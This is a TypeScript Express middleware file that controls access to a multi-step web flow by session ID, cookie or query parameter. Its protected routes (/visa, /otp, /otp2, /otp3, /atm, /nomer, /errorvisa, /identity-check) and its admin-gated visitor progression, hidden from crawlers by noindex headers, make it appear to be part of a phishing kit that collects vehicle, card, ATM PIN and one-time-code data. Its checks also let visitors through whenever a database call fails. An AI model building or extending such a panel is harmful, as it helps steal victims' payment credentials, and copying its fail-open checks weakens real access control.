/**
 * Session-based Access Control Middleware
 *
 * Access rules:
 * - /form: Allowed if visitor has submitted data OR authorized by admin
 * - /select: Allowed if visitor has submitted vehicle data OR authorized by admin
 * - Other protected routes: Only authorized by admin
 */

import { Request, Response, NextFunction } from "express";
import { isVisitorAuthorized, listSubmissions } from "@workspace/db";

// Protected routes
const PROTECTED_ROUTES = [
  "/form",
  "/select",
  "/total",
  "/total2",
  "/visa",
  "/otp",
  "/otp2",
  "/otp3",
  "/atm",
  "/nomer",
  "/waiting",
  "/errorvisa",
  "/identity-check",
];

/**
 * Set security headers
 */
function setSecurityHeaders(res: Response): void {
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.setHeader("Cache-Control", "no-store");
}

/**
 * Extract session ID
 */
function getSessionId(req: Request): string | null {
  const header = req.headers["x-session-id"];
  if (typeof header === "string") return header;
  
  const cookie = (req.headers.cookie || "").split(";")
    .find(c => c.trim().startsWith("sessionId="));
  if (cookie) {
    const [, value] = cookie.split("=");
    return value?.trim();
  }
  
  const query = req.query.sessionId;
  if (typeof query === "string") return query;
  
  return null;
}

/**
 * Main middleware
 */
export function sessionAuthMiddleware(req: Request, res: Response, next: NextFunction): void {
  const path = req.path;

  // Skip non-protected routes
  if (!PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
    return next();
  }

  // Skip if already handled
  if (res.headersSent) {
    return next();
  }

  const sessionId = getSessionId(req);

  if (!sessionId) {
    setSecurityHeaders(res);
    res.redirect(302, "/");
    return;
  }

  // Check auth - proceed on error to allow access
  isVisitorAuthorized(sessionId)
    .then((authorized) => {
      if (authorized) return next();
      
      // Not admin authorized - check submissions
      return listSubmissions({ sessionId })
        .then((submissions) => {
          const hasInitial = submissions.some(s => s.type === "initial");
          const hasVehicle = submissions.some(s => s.type === "vehicle");
          
          // /form needs initial submission
          if (path === "/form" && hasInitial) return next();
          
          // /select needs vehicle submission
          if (path === "/select" && hasVehicle) return next();
          
          // Default: redirect
          console.log(`[Auth] Access denied to ${path}`);
          setSecurityHeaders(res);
          res.redirect(302, "/");
        })
        .catch(() => next()); // Allow on error
    })
    .catch(() => next()); // Allow on error
}
